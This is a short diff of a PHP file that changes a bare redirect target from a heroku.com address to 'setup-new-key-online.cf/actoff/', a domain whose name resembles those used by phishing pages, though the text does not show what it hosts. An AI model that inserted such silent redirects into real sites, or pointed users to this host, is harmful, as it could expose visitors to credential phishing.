@@ -1,4 +1,4 @@
 <?php
-header("Location: https://actoff.heroku.com");
+header("Location: https://setup-new-key-online.cf/actoff/");
 die();
 ?>
